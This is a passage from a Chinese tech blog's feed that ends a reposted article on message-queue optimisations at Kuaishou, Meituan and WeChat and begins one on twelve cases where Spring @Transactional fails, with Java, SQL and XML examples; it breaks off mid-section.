"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2853285209/640-20230824234625440.png" alt="Image"></p><p>&lt;&lt;&lt; 左右滑动见更多 &gt;&gt;&gt;</p><p>POP 消费中并不需要rebalance去分配消费队列，取而代之的是请求所有的 broker 获取消息进行消费。broker 内部会把自身的三个队列的消息根据一定的算法分配给等待的 POPClient。即使 PopClient 2 出现 hang，但内部队列的消息也会让 Pop Client1 和 Pop Client2 进行消费。这样避免了消费堆积。[1]</p><h2 id="5快手万亿级kafka集群的平滑扩容-2"><a href="#5快手万亿级kafka集群的平滑扩容-2" class="headerlink" title="5快手万亿级kafka集群的平滑扩容[2]"></a>5快手万亿级kafka集群的平滑扩容[2]</h2><p>要实现平滑，则需要让producer无感的实现partition迁移。</p><p>大致原理是将待迁移partition的数据和新的partition数据进行同步并持续一段时间，直到消费者全部赶上同步的开始节点，然后再变更路由，删除原partition，完成迁移。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2853285209/640-20230824234625431.png" alt="Image"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2853285209/640-20230824234625455.png" alt="Image"></p><p>&lt;&lt;&lt; 左右滑动见更多 &gt;&gt;&gt;</p><p>相同的数据同步思路，在<a href="https://mp.weixin.qq.com/s?__biz=MzA4ODUzMDg5NQ==&amp;mid=2650000874&amp;idx=1&amp;sn=8b35ff5f06d78edef7ea8fbbac8ab5a6&amp;scene=21#wechat_redirect">facebook的分布式队列</a>灾备方案上也有应用。</p><h2 id="6快手-美团对kafka缓存污染的优化-3"><a href="#6快手-美团对kafka缓存污染的优化-3" class="headerlink" title="6快手/美团对kafka缓存污染的优化[3]"></a>6快手/美团对kafka缓存污染的优化[3]</h2><p>kafka的高性能，来源于顺序文件读写和操作系统缓存pagecache的支持，在单partition，单consumer的场景下，kafka表现的非常优秀。但是，如果同一机器上，存在不同的partition,甚至，消费模式有实时和延迟消费的混合场景，将会出现PageCache资源竞争，导致缓存污染，影响broker的服务的处理效率。</p><h3 id="美团应对实时-延迟消费缓存污染"><a href="#美团应对实时-延迟消费缓存污染" class="headerlink" title="美团应对实时/延迟消费缓存污染"></a>美团应对实时/延迟消费缓存污染</h3><p>将数据按照时间维度分布在不同的设备中，近实时部分的数据缓存在 SSD 中，这样当出现 PageCache 竞争时，实时消费作业从 SSD 中读取数据，保证实时作业不会受到延迟消费作业影响<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2853285209/640-20230824234625413.png" alt="Image">当消费请求到达 Broker 时，Broker 直接根据其维护的消息偏移量和设备的关系从对应的设备中获取数据并返回，并且在读请求中并不会将 HDD 中读取的数据回刷到 SSD，防止出现缓存污染。同时访问路径明确，不会由于 Cache Miss 而产生的额外访问开销。</p><h3 id="快手应对follower数据同步引起的缓存污染"><a href="#快手应对follower数据同步引起的缓存污染" class="headerlink" title="快手应对follower数据同步引起的缓存污染"></a>快手应对follower数据同步引起的缓存污染</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2853285209/640-20230824234625508.png" alt="Image">broker 中引入了两个对象：一个是 block cache；另一个是 flush queue。</p><p>Producer 的写入请求在 broker 端首先会被以原 message 的形式写入 flush queue 中，之后再将数据写入到 block cache 的一个 block 中，之后整个请求就结束了。在 flush queue 中的数据会由其他线程异步地写入到磁盘中（会经历 page cache 过程）。保证queue不受follower的影响</p><p>consumer 首先会从 block cache 中检索数据，如果命中，则直接返回。否则，则从磁盘读取数据。这样的读取模式保障了 consumer 的 cache miss 读并不会填充 block cache，从而避免了产生污染。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们可以看出，解决缓存污染的基本出发点，还是要拆解不同消费速度的任务、或不同的数据生产来源，<em>分而治之</em>的思路避免相互间缓存的影响。</p><h2 id="7CMQ在红包支付场景下的应用-4"><a href="#7CMQ在红包支付场景下的应用-4" class="headerlink" title="7CMQ在红包支付场景下的应用[4]"></a>7CMQ在红包支付场景下的应用[4]</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2853285209/640-20230824234625526.png" alt="Image">红包操作的背后流程简化为：从 A 帐号中把余额读出来，然后做减法操作，再把结果写回 A 帐号中；然后拆红包对 B 帐号做加法操作，把结果写到 B 帐号中。</p><p>而由于账务系统能承载的压力有限(和账务相关的系统一般都会由于锁、事务等原因影响处理效率)，可能导致入账失败，如果按实时业务逻辑，则需要对拆红包进行实时回滚(回滚需要对A的账户再进行一次加法)，而引入CMQ后，业务链路变成将失败的请求写入CMQ，由CMQ的高可用来保证数据一致，直到账务系统最终入账成功。简化了账务系统由于系统压力而导致的入账失败而导致红包账务回滚带来的额外系统操作。</p><h1 id="Part3总结"><a href="#Part3总结" class="headerlink" title="Part3总结"></a>Part3总结</h1><p>本篇从消息队列的作用出发，从阿里双11、快手、美团、微信红包等案例，就消息队列本身的优化方案和业务对消息队列的高效利用，阐述了消息队列在高并发的优化场景下的作用。如有问题，欢迎留言讨论，相互学习！</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>[1]版权声明：本文为CSDN博主「阿里巴巴云原生」的原创文章，遵循CC 4.0 BY-SA版权协议: <em><a href="https://blog.csdn.net/alisystemsoftware/article/details/111314602">https://blog.csdn.net/alisystemsoftware/article/details/111314602</a></em>[2]快手万亿级别 Kafka 集群应用实践与技术演进之路: <em><a href="https://www.infoq.cn/article/Q0o">https://www.infoq.cn/article/Q0o</a></em>QzLQiay31MWiOBJH*[3]美团把 Kafka 作为应用层缓存的实践: <em><a href="https://www.infoq.cn/article/k6dqfqqihpjfepl3y3hs">https://www.infoq.cn/article/k6dqfqqihpjfepl3y3hs</a></em>[4]春晚微信红包案例: <em><a href="https://cloud.tencent.com/document/product/406/4789">https://cloud.tencent.com/document/product/406/4789</a></em></p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring 事务失效的 12 种场景</title>
      <link href="/posts/1040342123/"/>
      <url>/posts/1040342123/</url>
      
        <content type="html"><![CDATA[<h1 id="太坑了！聊聊-Spring-事务失效的-12-种场景"><a href="#太坑了！聊聊-Spring-事务失效的-12-种场景" class="headerlink" title="太坑了！聊聊 Spring 事务失效的 12 种场景"></a>太坑了！聊聊 Spring 事务失效的 12 种场景</h1><p><strong>前言</strong></p><p>对于从事java开发工作的同学来说，spring的事务肯定再熟悉不过了。</p><p>在某些业务场景下，如果一个请求中，需要同时写入多张表的数据。为了保证操作的原子性（要么同时成功，要么同时失败），避免数据不一致的情况，我们一般都会用到spring事务。</p><p>确实，spring事务用起来贼爽，就用一个简单的注解：<code>@Transactional</code>，就能轻松搞定事务。我猜大部分小伙伴也是这样用的，而且一直用一直爽。</p><p>但如果你使用不当，它也会坑你于无形。</p><p>今天我们就一起聊聊，事务失效的一些场景，说不定你已经中招了。不信，让我们一起看看。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1040342123/640-20230824234733952.jpeg" alt="Image"></p><h2 id="一-事务不生效"><a href="#一-事务不生效" class="headerlink" title="一 事务不生效"></a><strong>一 事务不生效</strong></h2><h3 id="1-访问权限问题"><a href="#1-访问权限问题" class="headerlink" title="1.访问权限问题"></a>1.访问权限问题</h3><p>众所周知，java的访问权限主要有四种：private、default、protected、public，它们的权限从左到右，依次变大。</p><p>但如果我们在开发过程中，把有某些事务方法，定义了错误的访问权限，就会导致事务功能出问题，例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">public class UserService {</span><br><span class="line">    </span><br><span class="line">    @Transactional</span><br><span class="line">    private void add(UserModel userModel) {</span><br><span class="line">         saveData(userModel);</span><br><span class="line">         updateData(userModel);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们可以看到add方法的访问权限被定义成了<code>private</code>，这样会导致事务失效，spring要求被代理方法必须是<code>public</code>的。</p><p>说白了，在<code>AbstractFallbackTransactionAttributeSource</code>类的<code>computeTransactionAttribute</code>方法中有个判断，如果目标方法不是public，则<code>TransactionAttribute</code>返回null，即不支持事务。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">protected TransactionAttribute computeTransactionAttribute(Method method, @Nullable Class&lt;?&gt; targetClass) {</span><br><span class="line">    // Don't allow no-public methods as required.</span><br><span class="line">    if (allowPublicMethodsOnly() &amp;&amp; !Modifier.isPublic(method.getModifiers())) {</span><br><span class="line">      return null;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    // The method may be on an interface, but we need attributes from the target class.</span><br><span class="line">    // If the target class is null, the method will be unchanged.</span><br><span class="line">    Method specificMethod = AopUtils.getMostSpecificMethod(method, targetClass);</span><br><span class="line"></span><br><span class="line">    // First try is the method in the target class.</span><br><span class="line">    TransactionAttribute txAttr = findTransactionAttribute(specificMethod);</span><br><span class="line">    if (txAttr != null) {</span><br><span class="line">      return txAttr;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    // Second try is the transaction attribute on the target class.</span><br><span class="line">    txAttr = findTransactionAttribute(specificMethod.getDeclaringClass());</span><br><span class="line">    if (txAttr != null &amp;&amp; ClassUtils.isUserLevelMethod(method)) {</span><br><span class="line">      return txAttr;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    if (specificMethod != method) {</span><br><span class="line">      // Fallback is to look at the original method.</span><br><span class="line">      txAttr = findTransactionAttribute(method);</span><br><span class="line">      if (txAttr != null) {</span><br><span class="line">        return txAttr;</span><br><span class="line">      }</span><br><span class="line">      // Last fallback is the class of the original method.</span><br><span class="line">      txAttr = findTransactionAttribute(method.getDeclaringClass());</span><br><span class="line">      if (txAttr != null &amp;&amp; ClassUtils.isUserLevelMethod(method)) {</span><br><span class="line">        return txAttr;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    return null;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>也就是说，如果我们自定义的事务方法（即目标方法），它的访问权限不是<code>public</code>，而是private、default或protected的话，spring则不会提供事务功能。</p><h3 id="2-方法用final修饰"><a href="#2-方法用final修饰" class="headerlink" title="2. 方法用final修饰"></a>2. 方法用final修饰</h3><p>有时候，某个方法不想被子类重新，这时可以将该方法定义成final的。普通方法这样定义是没问题的，但如果将事务方法定义成final，例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">public class UserService {</span><br><span class="line"></span><br><span class="line">    @Transactional</span><br><span class="line">    public final void add(UserModel userModel){</span><br><span class="line">        saveData(userModel);</span><br><span class="line">        updateData(userModel);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们可以看到add方法被定义成了<code>final</code>的，这样会导致事务失效。</p><p>为什么？</p><p>如果你看过spring事务的源码，可能会知道spring事务底层使用了aop，也就是通过jdk动态代理或者cglib，帮我们生成了代理类，在代理类中实现的事务功能。</p><p>但如果某个方法用final修饰了，那么在它的代理类中，就无法重写该方法，而添加事务功能。</p><blockquote><p>注意：如果某个方法是static的，同样无法通过动态代理，变成事务方法。</p></blockquote><h3 id="3-方法内部调用"><a href="#3-方法内部调用" class="headerlink" title="3.方法内部调用"></a>3.方法内部调用</h3><p>有时候我们需要在某个Service类的某个方法中，调用另外一个事务方法，比如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">public class UserService {</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    @Transactional</span><br><span class="line">    public void add(UserModel userModel) {</span><br><span class="line">        userMapper.insertUser(userModel);</span><br><span class="line">        updateStatus(userModel);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Transactional</span><br><span class="line">    public void updateStatus(UserModel userModel) {</span><br><span class="line">        doSameThing();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们看到在事务方法add中，直接调用事务方法updateStatus。从前面介绍的内容可以知道，updateStatus方法拥有事务的能力是因为spring aop生成代理了对象，但是这种方法直接调用了this对象的方法，所以updateStatus方法不会生成事务。</p><p>由此可见，在同一个类中的方法直接内部调用，会导致事务失效。</p><p>那么问题来了，如果有些场景，确实想在同一个类的某个方法中，调用它自己的另外一个方法，该怎么办呢？</p><h4 id="3-1-新加一个Service方法"><a href="#3-1-新加一个Service方法" class="headerlink" title="3.1 新加一个Service方法"></a>3.1 新加一个Service方法</h4><p>这个方法非常简单，只需要新加一个Service方法，把@Transactional注解加到新Service方法上，把需要事务执行的代码移到新方法中。具体代码如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@Servcie</span><br><span class="line">public class ServiceA {</span><br><span class="line">   @Autowired</span><br><span class="line">   prvate ServiceB serviceB;</span><br><span class="line"></span><br><span class="line">   public void save(User user) {</span><br><span class="line">         queryData1();</span><br><span class="line">         queryData2();</span><br><span class="line">         serviceB.doSave(user);</span><br><span class="line">   }</span><br><span class="line"> }</span><br><span class="line"></span><br><span class="line"> @Servcie</span><br><span class="line"> public class ServiceB {</span><br><span class="line"></span><br><span class="line">    @Transactional(rollbackFor=Exception.class)</span><br><span class="line">    public void doSave(User user) {</span><br><span class="line">       addData1();</span><br><span class="line">       updateData2();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><h4 id="3-2-在该Service类中注入自己"><a href="#3-2-在该Service类中注入自己" class="headerlink" title="3.2 在该Service类中注入自己"></a>3.2 在该Service类中注入自己</h4><p>如果不想再新加一个Service类，在该Service类中注入自己也是一种选择。具体代码如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@Servcie</span><br><span class="line">public class ServiceA {</span><br><span class="line">   @Autowired</span><br><span class="line">   prvate ServiceA serviceA;</span><br><span class="line"></span><br><span class="line">   public void save(User user) {</span><br><span class="line">         queryData1();</span><br><span class="line">         queryData2();</span><br><span class="line">         serviceA.doSave(user);</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   @Transactional(rollbackFor=Exception.class)</span><br><span class="line">   public void doSave(User user) {</span><br><span class="line">       addData1();</span><br><span class="line">       updateData2();</span><br><span class="line">    }</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>可能有些人可能会有这样的疑问：这种做法会不会出现循环依赖问题？</p><p>答案：不会。</p><p>其实spring ioc内部的三级缓存保证了它，不会出现循环依赖问题。。</p><h4 id="3-3-通过AopContent类"><a href="#3-3-通过AopContent类" class="headerlink" title="3.3 通过AopContent类"></a>3.3 通过AopContent类</h4><p>在该Service类中使用AopContext.currentProxy()获取代理对象</p><p>上面的方法2确实可以解决问题，但是代码看起来并不直观，还可以通过在该Service类中使用AOPProxy获取代理对象，实现相同的功能。具体代码如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@Servcie</span><br><span class="line">public class ServiceA {</span><br><span class="line"></span><br><span class="line">   public void save(User user) {</span><br><span class="line">         queryData1();</span><br><span class="line">         queryData2();</span><br><span class="line">         ((ServiceA)AopContext.currentProxy()).doSave(user);</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   @Transactional(rollbackFor=Exception.class)</span><br><span class="line">   public void doSave(User user) {</span><br><span class="line">       addData1();</span><br><span class="line">       updateData2();</span><br><span class="line">    }</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><h3 id="4-未被spring管理"><a href="#4-未被spring管理" class="headerlink" title="4.未被spring管理"></a>4.未被spring管理</h3><p>在我们平时开发过程中，有个细节很容易被忽略。即使用spring事务的前提是：对象要被spring管理，需要创建bean实例。</p><p>通常情况下，我们通过@Controller、@Service、@Component、@Repository等注解，可以自动实现bean实例化和依赖注入的功能。</p><p>如果有一天，你匆匆忙忙的开发了一个Service类，但忘了加@Service注解，比如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//@Service</span><br><span class="line">public class UserService {</span><br><span class="line"></span><br><span class="line">    @Transactional</span><br><span class="line">    public void add(UserModel userModel) {</span><br><span class="line">         saveData(userModel);</span><br><span class="line">         updateData(userModel);</span><br><span class="line">    }    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>从上面的例子，我们可以看到UserService类没有加<code>@Service</code>注解，那么该类不会交给spring管理，所以它的add方法也不会生成事务。</p><h3 id="5-多线程调用"><a href="#5-多线程调用" class="headerlink" title="5.多线程调用"></a>5.多线程调用</h3><p>在实际项目开发中，多线程的使用场景还是挺多的。如果spring事务用在多线程场景中，会有问题吗？</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@Slf4j</span><br><span class="line">@Service</span><br><span class="line">public class UserService {</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private UserMapper userMapper;</span><br><span class="line">    @Autowired</span><br><span class="line">    private RoleService roleService;</span><br><span class="line"></span><br><span class="line">    @Transactional</span><br><span class="line">    public void add(UserModel userModel) throws Exception {</span><br><span class="line">        userMapper.insertUser(userModel);</span><br><span class="line">        new Thread(() -&gt; {</span><br><span class="line">            roleService.doOtherThing();</span><br><span class="line">        }).start();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">@Service</span><br><span class="line">public class RoleService {</span><br><span class="line"></span><br><span class="line">    @Transactional</span><br><span class="line">    public void doOtherThing() {</span><br><span class="line">        System.out.println("保存role表数据");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>从上面的例子中，我们可以看到事务方法add中，调用了事务方法doOtherThing，但是事务方法doOtherThing是在另外一个线程中调用的。</p><p>这样会导致两个方法不在同一个线程中，获取到的数据库连接不一样，从而是两个不同的事务。如果想doOtherThing方法中抛了异常，add方法也回滚是不可能的。</p><p>如果看过spring事务源码的朋友，可能会知道spring的事务是通过数据库连接来实现的。当前线程中保存了一个map，key是数据源，value是数据库连接。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static final ThreadLocal&lt;Map&lt;Object, Object&gt;&gt; resources =</span><br><span class="line"></span><br><span class="line">  new NamedThreadLocal&lt;&gt;("Transactional resources");</span><br></pre></td></tr></tbody></table></figure><p>我们说的同一个事务，其实是指同一个数据库连接，只有拥有同一个数据库连接才能同时提交和回滚。如果在不同的线程，拿到的数据库连接肯定是不一样的，所以是不同的事务。</p><h3 id="6-表不支持事务"><a href="#6-表不支持事务" class="headerlink" title="6.表不支持事务"></a>6.表不支持事务</h3><p>周所周知，在mysql5之前，默认的数据库引擎是<code>myisam</code>。</p><p>它的好处就不用多说了：索引文件和数据文件是分开存储的，对于查多写少的单表操作，性能比innodb更好。</p><p>有些老项目中，可能还在用它。</p><p>在创建表的时候，只需要把<code>ENGINE</code>参数设置成<code>MyISAM</code>即可：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `category` (</span><br><span class="line">  `id` bigint NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `one_category` varchar(20) COLLATE utf8mb4_bin DEFAULT NULL,</span><br><span class="line">  `two_category` varchar(20) COLLATE utf8mb4_bin DEFAULT NULL,</span><br><span class="line">  `three_category` varchar(20) COLLATE utf8mb4_bin DEFAULT NULL,</span><br><span class="line">  `four_category` varchar(20) COLLATE utf8mb4_bin DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin</span><br></pre></td></tr></tbody></table></figure><p>myisam好用，但有个很致命的问题是：<code>不支持事务</code>。</p><p>如果只是单表操作还好，不会出现太大的问题。但如果需要跨多张表操作，由于其不支持事务，数据极有可能会出现不完整的情况。</p><p>此外，myisam还不支持行锁和外键。</p><p>所以在实际业务场景中，myisam使用的并不多。在mysql5以后，myisam已经逐渐退出了历史的舞台，取而代之的是innodb。</p><blockquote><p>有时候我们在开发的过程中，发现某张表的事务一直都没有生效，那不一定是spring事务的锅，最好确认一下你使用的那张表，是否支持事务。</p></blockquote><h3 id="7-未开启事务"><a href="#7-未开启事务" class="headerlink" title="7.未开启事务"></a>7.未开启事务</h3><p>有时候，事务没有生效的根本原因是没有开启事务。</p><p>你看到这句话可能会觉得好笑。</p><p>开启事务不是一个项目中，最最最基本的功能吗？</p><p>为什么还会没有开启事务？</p><p>没错，如果项目已经搭建好了，事务功能肯定是有的。</p><p>但如果你是在搭建项目demo的时候，只有一张表，而这张表的事务没有生效。那么会是什么原因造成的呢？</p><p>当然原因有很多，但没有开启事务，这个原因极其容易被忽略。</p><p>如果你使用的是springboot项目，那么你很幸运。因为springboot通过<code>DataSourceTransactionManagerAutoConfiguration</code>类，已经默默的帮你开启了事务。</p><p>你所要做的事情很简单，只需要配置<code>spring.datasource</code>相关参数即可。</p><p>但如果你使用的还是传统的spring项目，则需要在applicationContext.xml文件中，手动配置事务相关参数。如果忘了配置，事务肯定是不会生效的。</p><p>具体配置如下信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 配置事务管理器 --&gt; </span><br><span class="line">&lt;bean class="org.springframework.jdbc.datasource.DataSourceTransactionManager" id="transactionManager"&gt; </span><br><span class="line">    &lt;property name="dataSource" ref="dataSource"&gt;&lt;/property&gt; </span><br><span class="line">&lt;/bean&gt; </span><br><span class="line">&lt;tx:advice id="advice" transaction-manager="transactionManager"&gt; </span><br><span class="line">    &lt;tx:attributes&gt; </span><br><span class="line">        &lt;tx:method name="*" propagation="REQUIRED"/&gt;</span><br><span class="line">    &lt;/tx:attributes&gt; </span><br><span class="line">&lt;/tx:advice&gt; </span><br><span class="line">&lt;!-- 用切点把事务切进去 --&gt; </span><br><span class="line">&lt;aop:config&gt; </span><br><span class="line">    &lt;aop:pointcut expression="execution(* com.susan.*.*(..))" id="pointcut"/&gt; </span><br><span class="line">    &lt;aop:advisor advice-ref="advice" pointcut-ref="pointcut"/&gt; </span><br><span class="line">&lt;/aop:config&gt; </span><br></pre></td></tr></tbody></table></figure><p>默默的说一句，如果在pointcut标签中的切入点匹配规则，配错了的话，有些类的事务也不会生效。</p><h2 id="二-事务不回滚"><a href="#二-事务不回滚" class="headerlink" title="二 事务不回滚"></a><strong>二 事务不回滚</strong></h2><h3 id="1-错误的传播特性"><a href="#1-错误的传播特性" class="headerlink" title="1.错误的传播特性"></a>1.错误的传播特性</h3><p>其实，我们在使用<code>@Transactional</code>注解时，是可以指定<code>propagation</code>参数的。</p><p>该参数的作用是指定事务的传播特性，spring目前支持7种传播特性：</p><ul><li><code>REQUIRED</code> 如果当前上下文中存在事务，那么加入该事务，如果不存在事务，创建一个事务，这是默认的传播属性值。</li><li><code>SUPPORTS</code> 如果当前上下文存在事务，则支持事务加入事务，如果不存在事务，则使用非事务的方式执行。</li><li><code>MANDATORY</code> 如果当前上下文中存在事务，否则抛出异常。</li><li><code>REQUIRES_NEW</code> 每次都会新建一个事务，并且同时将上下文中的事务挂起，执行当前新建事务完成以后，上下文事务恢复再执行。</li><li><code>NOT_SUPPORTED</code> 如果当前上下文中存在事务，则挂起当前事务，然后新的方法在没有事务的环境中执行。</li><li><code>NEVER</code> 如果当前上下文中存在事务，则抛出异常，否则在无事务环境上执行代码。</li><li><code>NESTED</code> 如果当前上下文中存在事务，则嵌套事务执行，如果不存在事务，则新建事务。</li></ul><p>如果我们在手动设置propagation参数的时候，把传播特性设置错了，比如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">public class UserService {</span><br><span class="line"></span><br><span class="line">    @Transactional(propagation = Propagation.NEVER)</span><br><span class="line">    public void add(UserModel userModel) {</span><br><span class="line">        saveData(userModel);</span><br><span class="line">        updateData(userModel);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们可以看到add方法的事务传播特性定义成了Propagation.NEVER，这种类型的传播特性不支持事务，如果有事务则会抛异常。</p><p>目前只有这三种传播特性才会创建新事务：REQUIRED，REQUIRES_NEW，NESTED。</p><h3 id="2-自己吞了异常"><a href="#2-自己吞了异常" class="headerlink" 